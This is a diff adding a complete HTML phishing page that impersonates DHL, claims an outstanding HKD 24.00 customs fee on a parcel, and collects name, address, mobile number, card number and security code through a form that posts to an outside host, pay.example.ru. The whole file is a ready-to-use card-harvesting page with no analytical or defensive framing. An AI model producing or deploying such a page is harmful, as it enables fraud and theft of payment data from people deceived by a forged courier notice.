@@ -1,0 +1,34 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>DHL - Redelivery</title>
+<style>
+  body { font-family: system-ui, sans-serif; margin: 0; background: #f6f7f9; color: #202124; }
+  .wrap { max-width: 520px; margin: 48px auto; background: #fff; padding: 32px; border-radius: 12px;
+           box-shadow: 0 1px 4px rgba(0,0,0,.12); }
+  h1 { font-size: 20px; margin: 0 0 4px; }
+  p.lede { margin: 0 0 24px; color: #5f6368; font-size: 14px; }
+  label { display: block; margin: 14px 0 4px; font-size: 13px; font-weight: 600; }
+  input, select { width: 100%; box-sizing: border-box; padding: 9px 10px; font-size: 14px;
+                   border: 1px solid #dadce0; border-radius: 6px; }
+  button { margin-top: 22px; width: 100%; padding: 11px; font-size: 15px; border: 0;
+            border-radius: 6px; background: #1a73e8; color: #fff; cursor: pointer; }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<h1>Schedule your redelivery</h1>
+<p class="lede">A customs fee of HKD 24.00 is outstanding on parcel 4471820933.</p>
+<form action="https://pay.example.ru/charge" method="post">
+  <label for="nm">Full name</label><input id="nm" name="name" autocomplete="name" required>
+  <label for="addr">Delivery address</label><input id="addr" name="addr" autocomplete="street-address" required>
+  <label for="tel">Mobile number</label><input id="tel" name="tel" type="tel" autocomplete="tel" required>
+  <label for="cc">Card number</label><input id="cc" name="cc" autocomplete="cc-number" required>
+  <label for="cvv">Security code</label><input id="cvv" name="cvv" required>
+  <button type="submit">Pay HKD 24.00</button>
+</form>
+</div>
+</body>
+</html>
